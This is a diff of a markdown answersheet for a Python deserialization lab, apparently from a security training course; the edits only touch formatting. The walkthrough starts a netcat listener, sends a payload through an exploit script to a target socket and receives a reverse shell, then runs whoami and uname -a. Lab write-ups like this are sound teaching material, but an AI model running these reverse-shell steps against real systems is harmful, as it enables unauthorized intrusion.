@@ -1,21 +1,21 @@
 # Python Deserialization Answersheet
 
-**Step 1:** Navigate to "Python: Connect over TCP Socket: 16662"
+**Step 1:** Navigate to "Python: Connect over TCP Socket: 16662".<br />
 <kbd> <img src="1.png" /> </kbd>
 <br /> <br />
 
-**Step 2:** Capture the IP Address and port.
+**Step 2:** Capture the IP Address and port.<br />
 <kbd> <img src="2.png" /> </kbd>
 <br /> <br />
 
-**Step 3:** Start the listener using following command
+**Step 3:** Start the listener using following command.<br />
 ```
 `nc -nlvp 5555
 ```
 <kbd> <img src="3.png" /> </kbd>
 <br /> <br />
 
-**Step 4:** Use the following code to generate the payload
+**Step 4:** Use the following code to generate the payload.<br />
 ```python
 #!/usr/bin/env python
 #payload.py
@@ -46,13 +46,13 @@ print soc.recv(1024)
 soc.send(payload) 
 ```
 
-**Step 5:** Run the exploit file using following command
+**Step 5:** Run the exploit file using following command.<br />
 ```
 python py_exploit.py 192.168.29.88 5555 192.168.29.201 16662
 ```
 <kbd> <img src="4.png" /> </kbd>
 <br /> <br />
 
-**Step 6:** Received the connection on Reverse shell and now we can extract the system information using whoami, uname -a command
+**Step 6:** A connection will be received on reverse shell. Extract the system information using whoami, uname -a command.<br />
 <kbd> <img src="5.png" /> </kbd>
 <br /> <br />
